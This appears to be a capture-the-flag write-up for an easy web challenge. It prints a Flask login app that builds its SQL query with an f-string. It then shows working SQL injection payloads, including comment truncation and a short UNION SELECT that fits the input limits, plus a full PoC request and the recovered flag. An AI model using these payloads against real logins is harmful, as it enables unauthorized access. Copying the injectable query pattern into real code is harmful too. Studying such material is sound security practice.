---
slug: "web-xmas-login"
title: "Xmas Login"
competition: "Alpacahack"
category: "Web"
difficulty: "Easy"
date: "2026-11-04"
updated: "2026-11-04"
summary: "SQL Injection, but there's an input limit."
tags: ["SQL INJECTION","SQLI"]
status: "published"
flag: "Alpaca{M3rry_Xmas!_Th1s_is_4_g1ft_fr0m_santa!_and_Happy_N3w_Year_2026!!}"
attachments: []
source: "https://claritys.web.id/writeups/web-xmas-login"
---

# Xmas Login

> SQL Injection, but there's an input limit.

## Recon

We got these files:

```python
~/ctf/alpacahack/web/xmas-login
❯ tree                                                                                                                                                                        󰥔 10:12:08
.
├── compose.yaml
└── web
    ├── app.py
    ├── Dockerfile
    └── requirements.txt

2 directories, 4 files
```

Let’s check to the `app.py`.

```python
from flask import Flask, request
import sqlite3
import os

FLAG = os.environ.get("FLAG", "Alpaca{*****************************DUMMY******************************}")
assert len(FLAG) == 72
FLAG_1, FLAG_2, FLAG_3 = FLAG[:24], FLAG[24:48], FLAG[48:]

app = Flask(__name__)

@app.get("/")
def index():
    return """
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://unpkg.com/sakura.css/css/sakura.css" type="text/css" /></head>
<body>
  <main>
    <h1>Xmas Login 🦙🦌🎅</h1>
    <p> There are three users: alpaca, reindeer and santa_claus_admin. </p>
    <form id="login-form">
      <label for="username">Username</label>
      <input name="username" placeholder="alpaca" maxlength="12" required>
      <label for="password">Password</label>
      <input name="password" placeholder="" maxlength="48" required>
      <button type="submit" id="login-btn">Login</button>
    </form>
    <h6>Executed SQL:</h6>
    <pre><code id="sql"></code></pre>
    <h6>Response:</h6>
    <pre><code id="code"></code></pre>
  </main>
  <script>
    document.getElementById("login-form").onsubmit = async (e) => {
      e.preventDefault();
      const form = e.target;
      const formData = new FormData(form);
      const response = await fetch("/login", {
        method: "POST",
        body: formData,
      });
      const text = await response.text();
      document.getElementById("sql").textContent = `SELECT * FROM users WHERE username='${formData.get("username")}' AND password='${formData.get("password")}';`;
      document.getElementById("code").textContent = text;
    };
  </script>
</body>
    """.strip()

@app.post("/login")
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    if len(username) > 12 or len(password) > 48:
        return "Your input is too long!"

    conn = sqlite3.connect("database.db")
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )

    error = None
    try:
        user = conn.execute(query).fetchone()
    except sqlite3.Error as e:
        user = None
        error = str(e)
    conn.close()

    if error:
        return f"SQL error: {error}"

    if user is None:
        return "invalid credentials"

    if user[0] == "alpaca":
        return f"Hello, alpaca! Here is your flag: {FLAG_1}"
    elif user[0] == "reindeer":
        return f"Hello, reindeer! Here is your flag: {FLAG_2}"
    elif user[0] == "santa_claus_admin":
        return f"Hello, santa_claus_admin! Here is your flag: {FLAG_3}"
    else:
        return f"Hello, {user[0]}!"

def init_db():
    conn = sqlite3.connect("database.db")
    conn.execute(
        """
    CREATE TABLE IF NOT EXISTS users (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL
    );
    """
    )
    password_1, password_2, password_3 = (
        os.urandom(16).hex(),
        os.urandom(16).hex(),
        os.urandom(16).hex(),
    )
    conn.execute(
        f"""INSERT OR IGNORE INTO users (username, password) VALUES
        ('alpaca', '{password_1}'),
        ('reindeer', '{password_2}'),
        ('santa_claus_admin', '{password_3}');
    """
    )
    conn.commit()
    conn.close()

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=3000)
```

Okay so we have to login as a `alpaca, reindeer, and santa_claus_admin` so we can got all part of the flag.

## Vulnerability

As we can see in the source code, there’s a `SQL Injection` `vulnerability` at this `snippet`:

```python
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )
```

Why? Because the `query` using `Format String`, which is bring us so we can use `SQL Injection` at that point because of `format string`.

```python
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )
```

**"F-strings perform direct string concatenation. This means that whatever the user types inside the username and password variables will be directly inserted and executed as part of the SQL command."**

F-string melakukan penggabungan string secara langsung (string concatenation). Artinya, apa pun yang diketik oleh pengguna di dalam variabel username dan password akan langsung dimasukkan dan dieksekusi sebagai bagian dari perintah SQL.

So now lets use the SQL Injection technique for this challenge, at first i use the user alpaca.

I got the payload from this reference:

-   [https://dev.to/deoxys/sql-injection-all-concepts-all-payloads-all-in-one-4ch5](https://dev.to/deoxys/sql-injection-all-concepts-all-payloads-all-in-one-4ch5)
    

![image.png](/assets/uploads/d75d2cc0-aa79-49cb-84df-6bdf64e22edd-image.png)

After i want to try for the second one, the output is always the first part. When i tried to use these payloads:

`' OR 1=1 --` or `' OR '1'='1`

![image.png](/assets/uploads/80a09567-e711-4c3d-a022-2274a542e1b3-image-1.png)

After that i searched can we have another alternative payloads, and then i found it from this reference:

-   [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)
    

We can input `<user>' --` in the user part. So the output will goes like this at the SQLed:

```python
SELECT * FROM users WHERE username='admin' --' AND password='...';
```

The password is ignored.

![image.png](/assets/uploads/906d7092-5974-4d7c-acc0-429063df858c-image-2.png)

So the first part:

Alpaca{M3rry\_Xmas!_Th1s_

And the second part:

![image.png](/assets/uploads/f775a39b-c314-4f32-bee6-dbbd848d718a-image-3.png)

is\_4\_g1ft\_fr0m\_santa!\_an

For the third / last part, sadly we can’t use the `<user>' --` because our input its too long.

At this snippet where is the length calculated:

```python
    if len(username) > 12 or len(password) > 48:
        return "Your input is too long!"
```

![image.png](/assets/uploads/1eb4c888-e84b-49bb-a506-d1a9f7da7d03-image-4.png)

So we have to use other payloads.

I got this payload and it can be used for other parts too.

```python
' UNION SELECT 'reindeer',1 --
```

![image.png](/assets/uploads/7c09bba9-f596-4818-90af-230d8d9ed4e5-image-5.png)

![image.png](/assets/uploads/d60a5bb1-fb6e-4cac-a8bc-6b3eb40167e7-image-6.png)

So now we got the third flag:

d\_Happy\_N3w\_Year\_2026!!}

Now lets combine all the flag become this:

```python
Alpaca{M3rry_Xmas!_Th1s_is_4_g1ft_fr0m_santa!_and_Happy_N3w_Year_2026!!}
```

## PoC request

```
POST /login HTTP/1.1
Host: 34.170.146.252:32445
Content-Length: 278
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTBHdEwJjqKolmPyb
Accept: */*
Origin: http://34.170.146.252:32445
Referer: http://34.170.146.252:32445
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryTBHdEwJjqKolmPyb
Content-Disposition: form-data; name="username"

anything
------WebKitFormBoundaryTBHdEwJjqKolmPyb
Content-Disposition: form-data; name="password"

' UNION SELECT 'santa_claus_admin',1 --
------WebKitFormBoundaryTBHdEwJjqKolmPyb--
```
